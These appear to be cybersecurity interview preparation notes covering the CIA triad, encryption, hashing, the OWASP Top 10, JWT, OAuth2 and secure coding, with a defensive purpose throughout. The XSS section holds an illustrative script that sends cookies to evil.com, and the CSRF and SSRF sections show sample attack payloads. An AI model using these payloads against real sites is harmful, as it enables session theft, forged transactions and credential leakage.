# Cybersecurity — Senior Interview Preparation Notes

## 1. CIA Triad — In Depth

### Confidentiality
- Ensure data is accessible only to authorized parties
- **Mechanisms**: Encryption (at rest and in transit), access controls (RBAC, ABAC), data classification, DLP (Data Loss Prevention)
- **Threat**: Data breaches, eavesdropping, insider threats
- **Example**: Patient medical records encrypted in database, decrypted only by authorized healthcare staff

### Integrity
- Ensure data has not been tampered with or altered
- **Mechanisms**: Hashing (SHA-256), digital signatures, checksums, version control, audit logs
- **Threat**: Man-in-the-middle attacks, data corruption, unauthorized modification
- **Example**: Software update signed with publisher's private key; client verifies signature before installing

### Availability
- Ensure systems and data are accessible when needed
- **Mechanisms**: Redundancy (multi-AZ, multi-region), load balancing, DDoS protection, backups, disaster recovery
- **Threat**: DDoS attacks, hardware failures, ransomware
- **Example**: Auto-scaling web servers behind a load balancer with health checks

**Interview Q: How do these three sometimes conflict?**
Stronger encryption (confidentiality) can increase latency and reduce availability. Redundant copies (availability) increase attack surface for confidentiality breaches. Security controls that enforce integrity checks can slow down systems. Engineers must balance trade-offs based on risk assessment.

---

## 2. Authentication vs Authorization

| Aspect | Authentication (AuthN) | Authorization (AuthZ) |
|--------|----------------------|---------------------|
| Question | "Who are you?" | "What can you do?" |
| Mechanism | Passwords, MFA, biometrics, tokens | RBAC, ABAC, policies |
| Protocols | OAuth2 (AuthZ grant), OIDC, SAML | OAuth2 scopes, IAM policies |
| When | Before authorization | After authentication |

### Multi-Factor Authentication (MFA)
- **Something you know**: Password, PIN
- **Something you have**: Phone (TOTP, SMS), hardware key (YubiKey)
- **Something you are**: Fingerprint, face ID

**Best Practice**: SMS-based MFA is vulnerable to SIM-swapping; prefer TOTP (authenticator apps) or hardware security keys (FIDO2/WebAuthn).

---

## 3. Encryption

### Symmetric vs Asymmetric

| Feature | Symmetric | Asymmetric |
|---------|-----------|-----------|
| Keys | One shared key | Public + Private key pair |
| Speed | Fast | Slow (100-1000x slower) |
| Use case | Bulk data encryption | Key exchange, digital signatures |
| Algorithms | AES-256, ChaCha20 | RSA-2048+, ECDSA, Ed25519 |

**Hybrid approach** (TLS): Use asymmetric to exchange symmetric key, then symmetric for data transfer.

### TLS/SSL Handshake (TLS 1.3)
1. **ClientHello**: Supported cipher suites, key shares (DH params), TLS version
2. **ServerHello**: Chosen cipher, server key share, certificate
3. **Client verifies** certificate chain against trusted CAs
4. Both derive shared secret from key exchange → symmetric session keys
5. Encrypted communication begins

**TLS 1.3 improvements**: 1-RTT handshake (vs 2-RTT in 1.2), 0-RTT resumption, removed insecure algorithms (RSA key exchange, CBC mode), only AEAD ciphers (AES-GCM, ChaCha20-Poly1305).

### Encryption at Rest vs In Transit
- **At rest**: AES-256 for stored data (S3, EBS, RDS encryption)
- **In transit**: TLS 1.2/1.3 for network communication
- **End-to-end**: Only sender and recipient can decrypt (Signal, WhatsApp)

---

## 4. Hashing

### Properties of Cryptographic Hash Functions
- **Deterministic**: Same input → same output
- **Irreversible**: Cannot derive input from hash (one-way)
- **Collision-resistant**: Infeasible to find two inputs with same hash
- **Avalanche effect**: Small input change → drastically different hash

### Common Hash Functions
| Algorithm | Output Size | Use Case | Secure? |
|-----------|------------|----------|---------|
| MD5 | 128-bit | Checksums only | No (collision attacks) |
| SHA-1 | 160-bit | Legacy | No (broken 2017) |
| SHA-256 | 256-bit | Data integrity, certificates | Yes |
| SHA-3 | Variable | Modern alternative | Yes |
| bcrypt | 184-bit | Password hashing | Yes |
| Argon2 | Variable | Password hashing (winner of PHC) | Yes (recommended) |

### Password Hashing & Salting
```python
import bcrypt

# Hashing (salt is auto-generated and embedded in hash)
password = b"user_password"
hashed = bcrypt.hashpw(password, bcrypt.gensalt(rounds=12))

# Verification
if bcrypt.checkpw(password, hashed):
    print("Authenticated")
```

**Why salt?**
- Without salt: identical passwords produce identical hashes → vulnerable to rainbow tables
- Salt: random value prepended to password before hashing; each user gets unique salt
- bcrypt/Argon2 include salt in output automatically

**Why bcrypt/Argon2 over SHA-256 for passwords?**
- Deliberately slow (configurable work factor) — resistant to brute force
- SHA-256 is fast (designed for speed) — bad for passwords; GPUs can compute billions per second

---

## 5. OWASP Top 10

### 1. Injection (SQL, NoSQL, OS Command, LDAP)
```python
# VULNERABLE — string concatenation
query = f"SELECT * FROM users WHERE username = '{user_input}'"

# SAFE — parameterized query
cursor.execute("SELECT * FROM users WHERE username = %s", (user_input,))
```
**Prevention**: Parameterized queries, ORMs, input validation, least privilege DB accounts.

### 2. Broken Authentication
- Weak passwords, credential stuffing, session fixation
- **Prevention**: Enforce strong passwords, implement MFA, rate limit login attempts, use secure session management, invalidate sessions on logout

### 3. Cross-Site Scripting (XSS)
```html
<!-- Stored XSS — malicious script saved in DB -->
<div class="comment">
  <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
</div>
```
**Types:**
- **Stored**: Script persisted in database
- **Reflected**: Script in URL reflected back in response
- **DOM-based**: Client-side JavaScript manipulates DOM unsafely

**Prevention:**
- Output encoding (HTML entity encoding)
- Content Security Policy (CSP) header
- Use frameworks that auto-escape (React, Angular)
- Sanitize HTML input (DOMPurify)
- Set `httpOnly` flag on cookies (prevents JS access)

### 4. Cross-Site Request Forgery (CSRF)
```html
<!-- Attacker's page — triggers unwanted action on victim's behalf -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
```
**Prevention:**
- CSRF tokens (Synchronizer Token Pattern)
- `SameSite=Strict` or `SameSite=Lax` cookie attribute
- Check `Origin` / `Referer` headers
- Require re-authentication for sensitive actions

### 5. Server-Side Request Forgery (SSRF)
- Attacker tricks server into making requests to internal resources
```
# Attacker sends: url=http://169.254.169.254/latest/meta-data/
# Server fetches AWS metadata endpoint — leaks credentials
```
**Prevention:**
- Whitelist allowed domains/IPs
- Block requests to internal IP ranges (10.x, 172.16.x, 169.254.x)
- Use network segmentation; metadata endpoint IMDSv2 (requires token)

### 6. Insecure Deserialization
- Untrusted data deserialized can execute arbitrary code
- **Prevention**: Don't deserialize untrusted data; use safe formats (JSON over Java serialization); validate and sanitize before deserialization; implement integrity checks

### 7. Security Misconfiguration
- Default credentials, unnecessary services, verbose error messages, missing security headers
- **Prevention**: Automated hardening, minimal installations, disable directory listing, custom error pages, security headers

### Other Top 10 Items
- **Broken Access Control**: Users accessing unauthorized resources (IDOR, privilege escalation)
- **Cryptographic Failures**: Weak encryption, plaintext transmission, insecure key storage
- **Vulnerable Components**: Outdated libraries with known CVEs
- **Insufficient Logging & Monitoring**: Unable to detect or investigate breaches

---

## 6. Network Security

### Firewalls
- **Packet filtering**: Rules based on IP, port, protocol (stateless)
- **Stateful**: Tracks connection state; allows return traffic automatically
- **WAF** (Web Application Firewall): Inspects HTTP traffic; blocks SQL injection, XSS, bot traffic
- **Next-gen (NGFW)**: Deep packet inspection, application awareness, IPS integration

### IDS vs IPS
| Feature | IDS (Detection) | IPS (Prevention) |
|---------|-----------------|-------------------|
| Action | Alerts on threats | Blocks threats inline |
| Position | Passive (mirror/tap) | Inline (traffic passes through) |
| Risk | May miss attacks | May block legitimate traffic (false positive) |

### VPN
- **Site-to-site**: Connects two networks (office to cloud VPC)
- **Client VPN**: Individual device to network (remote workers)
- **Protocols**: IPSec, WireGuard (modern, faster), OpenVPN

### Zero Trust Architecture
**Principle**: "Never trust, always verify" — no implicit trust based on network location.

**Core tenets:**
1. Verify explicitly (authenticate and authorize every request)
2. Least privilege access (just-in-time, just-enough access)
3. Assume breach (segment access, encrypt everything, monitor continuously)

**Implementation**: Identity-based access (not network-based), micro-segmentation, MFA everywhere, continuous validation, device health checks.

**Interview Q: How does Zero Trust differ from traditional perimeter security?**
Traditional: "Castle and moat" — trust everything inside the network perimeter. Zero Trust: Verify every request regardless of origin; lateral movement is prevented by micro-segmentation. In cloud/remote-work era, there is no clear perimeter.

---

## 7. Secure Coding Practices

### Input Validation
```python
import re

def validate_email(email: str) -> bool:
    """Validate email format — whitelist approach."""
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, email)) and len(email) <= 254

def validate_age(age_str: str) -> int:
    """Validate and convert age — reject invalid input early."""
    try:
        age = int(age_str)
    except ValueError:
        raise ValueError("Age must be a number")
    if not 0 <= age <= 150:
        raise ValueError("Age must be between 0 and 150")
    return age
```

**Principles:**
- **Whitelist over blacklist**: Define what IS allowed, not what isn't
- **Validate at boundaries**: API endpoints, form submissions, file uploads
- **Fail closed**: Reject input that doesn't match expected format
- **Different from sanitization**: Validation rejects bad input; sanitization cleans it

### Secure Defaults
- Deny all access by default; explicitly grant permissions
- Encrypt by default; opt out when needed
- Disable debugging/verbose errors in production
- Use strict Content Security Policies

### Secret Management
- **Never** hardcode secrets in source code
- Use: AWS Secrets Manager, HashiCorp Vault, environment variables (in secure runtimes)
- Rotate secrets regularly; use short-lived credentials where possible
- Scan for leaked secrets: git-secrets, truffleHog, GitHub secret scanning

---

## 8. Security Headers

```
# Essential security headers
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
X-Content-Type-Options: nosniff                    # Prevent MIME sniffing
X-Frame-Options: DENY                              # Prevent clickjacking
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload  # HSTS
Referrer-Policy: strict-origin-when-cross-origin    # Control referrer info
Permissions-Policy: camera=(), microphone=(), geolocation=()  # Restrict browser features
X-XSS-Protection: 0                                # Deprecated; rely on CSP instead
```

### Content Security Policy (CSP) Deep Dive
- Controls which sources can load scripts, styles, images, fonts, etc.
- **Prevent XSS**: `script-src 'self'` blocks inline scripts and scripts from other domains
- **Report-only mode**: `Content-Security-Policy-Report-Only` for testing before enforcement
- **Nonce-based**: `script-src 'nonce-abc123'` — allow specific inline scripts with matching nonce

---

## 9. Token-Based Security (JWT)

### JWT Structure
```
Header.Payload.Signature

Header: { "alg": "RS256", "typ": "JWT" }
Payload: { "sub": "user123", "role": "admin", "iat": 1700000000, "exp": 1700000900 }
Signature: RS256(base64(header) + "." + base64(payload), privateKey)
```

### JWT Security Best Practices
- **Short expiry** (15 min for access tokens)
- **Refresh tokens**: Long-lived (days/weeks), stored in httpOnly cookie, used to obtain new access tokens
- **Token rotation**: Issue new refresh token with each use; invalidate old one (detect theft)
- **Never store in localStorage** — XSS can steal them
- **Include only necessary claims** — JWTs are Base64, not encrypted; anyone can read the payload
- **Validate everything**: signature, expiry, issuer, audience
- **Use asymmetric signing (RS256/ES256)** for distributed systems — services verify with public key without needing shared secret
- **Algorithm confusion attack**: Always validate `alg` header; don't allow `none`

### Token Storage
| Location | XSS Risk | CSRF Risk | Recommendation |
|----------|----------|-----------|---------------|
| localStorage | High (JS accessible) | None | Avoid for sensitive tokens |
| httpOnly cookie | None (no JS access) | Moderate | Best for refresh tokens |
| Memory (variable) | Low (cleared on navigation) | None | Good for access tokens |

**Recommended pattern**: Access token in memory (JS variable) + Refresh token in httpOnly, Secure, SameSite cookie.

---

## 10. OAuth2 Flows

### Authorization Code + PKCE (Recommended for SPAs/Mobile)
```
1. Client generates code_verifier (random string) and code_challenge (SHA256 hash)
2. Client redirects to: /authorize?response_type=code&code_challenge=X&...
3. User authenticates and consents
4. Authorization server redirects back with authorization code
5. Client exchanges code + code_verifier for tokens at /token endpoint
6. Server verifies: SHA256(code_verifier) == original code_challenge
7. Returns access_token + refresh_token
```

### Client Credentials Flow (Machine-to-Machine)
```
1. Service sends client_id + client_secret to /token
2. Authorization server returns access_token
3. No user involved — service-to-service communication
```

### Key Points
- **Implicit flow is deprecated** → Use Authorization Code + PKCE instead
- **Scopes**: Define granular permissions (read:users, write:orders)
- **State parameter**: Prevents CSRF during OAuth flow (random, verified on callback)
- OIDC (OpenID Connect) adds identity layer on top of OAuth2 (ID token with user info)

---

## 11. Rate Limiting

### Algorithms
- **Fixed Window**: Count requests per time window (e.g., 100/minute). Edge case: 200 requests in 1 second spanning two windows.
- **Sliding Window Log**: Track timestamp of each request; precise but memory-intensive.
- **Sliding Window Counter**: Weighted average of current and previous window; good balance.
- **Token Bucket**: Tokens added at fixed rate; request consumes token; allows bursts up to bucket size. Most commonly used.
- **Leaky Bucket**: Requests processed at constant rate; excess queued or dropped.

### Implementation Considerations
```python
# Redis-based rate limiter (token bucket concept)
import redis
import time

def is_rate_limited(user_id: str, limit: int = 100, window: int = 60) -> bool:
    """Simple sliding window rate limiter with Redis."""
    r = redis.Redis()
    key = f"rate_limit:{user_id}"
    current = r.get(key)
    if current and int(current) >= limit:
        return True
    pipe = r.pipeline()
    pipe.incr(key)
    pipe.expire(key, window)
    pipe.execute()
    return False
```

**Best Practices:**
- Rate limit by user ID (authenticated) or IP (unauthenticated)
- Return `429 Too Many Requests` with `Retry-After` header
- Different limits for different endpoints (login stricter than reads)
- Distributed rate limiting needs shared state (Redis)

---

## 12. Penetration Testing

### Methodology (PTES)
1. **Reconnaissance**: Passive (OSINT, DNS, WHOIS) and active (port scanning, service enumeration)
2. **Scanning**: Vuln scanning (Nessus, OpenVAS), web app scanning (OWASP ZAP, Burp Suite)
3. **Exploitation**: Attempt to exploit found vulnerabilities
4. **Post-Exploitation**: Privilege escalation, lateral movement, data exfiltration
5. **Reporting**: Findings, impact, risk ratings, remediation recommendations

### Types
- **Black box**: No prior knowledge of the system
- **White box**: Full knowledge (source code, architecture, credentials)
- **Grey box**: Partial knowledge (typical for authenticated testing)

### Common Tools (Know at a High Level)
- **Nmap**: Port scanning, service detection
- **Burp Suite**: Web application security testing
- **Metasploit**: Exploitation framework
- **OWASP ZAP**: Open-source web app scanner
- **Wireshark**: Network packet analysis

---

## 13. Security in CI/CD

### Security Scanning in Pipeline
```yaml
# Example: Security gates in CI/CD
stages:
  - lint          # Code quality
  - sast          # Static Application Security Testing (Semgrep, SonarQube)
  - test          # Unit + integration tests
  - dependency    # Dependency vulnerability scan (Snyk, Dependabot, npm audit)
  - container     # Container image scan (Trivy, Grype)
  - dast          # Dynamic Application Security Testing (OWASP ZAP)
  - deploy        # Deploy only if all gates pass
```

### DevSecOps Practices
- **Shift left**: Integrate security early in development, not just before deployment
- **Automated scanning**: SAST, DAST, SCA (Software Composition Analysis) in every build
- **Infrastructure scanning**: Terraform/CloudFormation static analysis (Checkov, tfsec)
- **Secret detection**: Pre-commit hooks scanning for credentials (git-secrets, detect-secrets)
- **Signed artifacts**: Sign container images and build artifacts; verify before deployment
- **Least privilege CI**: Pipeline service accounts have minimal permissions
- **Immutable infrastructure**: Deploy new instances rather than patching running ones

---

## Common Interview Pitfalls

1. **Confusing encoding, encryption, and hashing**: Base64 is encoding (reversible, no key); AES is encryption (reversible with key); SHA-256 is hashing (irreversible)
2. **Using MD5/SHA-256 for passwords**: Use bcrypt/Argon2 — designed to be slow
3. **"Security through obscurity"**: Hiding implementation details is NOT a security strategy; assume the attacker knows your system (Kerckhoffs' principle)
4. **Ignoring the human factor**: Social engineering, phishing, insider threats are top attack vectors
5. **Over-focusing on tools**: Security is a process and mindset, not a product you install

---

## Real-World Scenario Questions

**Q: How would you secure a REST API?**
1. **Transport**: TLS 1.3 everywhere; HSTS header
2. **Authentication**: JWT with short expiry + refresh tokens; OAuth2 for third-party access
3. **Authorization**: RBAC or ABAC; validate permissions per endpoint
4. **Input validation**: Whitelist approach; sanitize all inputs; parameterized queries
5. **Rate limiting**: Token bucket per user/IP; stricter on auth endpoints
6. **Headers**: CSP, X-Content-Type-Options, X-Frame-Options
7. **Logging**: Log all auth events, access denials, errors (no sensitive data in logs)
8. **Dependencies**: Automated vulnerability scanning; keep dependencies updated
9. **CORS**: Whitelist specific origins; never wildcard with credentials
10. **API keys**: Separate from user auth; rotate regularly; scope to specific operations

**Q: You discover a data breach. What do you do?**
1. **Contain**: Isolate affected systems; revoke compromised credentials; block attacker access
2. **Assess**: Determine scope — what data was accessed, how many users affected, entry point
3. **Preserve evidence**: Forensic copies of logs, memory dumps, disk images
4. **Notify**: Legal/compliance team, affected users (GDPR: 72 hours), authorities if required
5. **Remediate**: Patch vulnerability, rotate all credentials, review access controls
6. **Post-incident**: Root cause analysis, update incident response plan, implement preventive controls
7. **Monitor**: Enhanced monitoring for follow-up attacks; validate remediation effectiveness

**Q: How do you implement defense in depth?**
Layer security controls so that if one fails, others still protect:
- **Network**: Firewalls, IDS/IPS, network segmentation, VPN
- **Host**: OS hardening, antivirus, host-based firewall, patch management
- **Application**: Input validation, output encoding, CSP, WAF
- **Data**: Encryption at rest and in transit, access controls, backups
- **Identity**: MFA, least privilege, regular access reviews
- **Monitoring**: SIEM, log analysis, anomaly detection, incident response
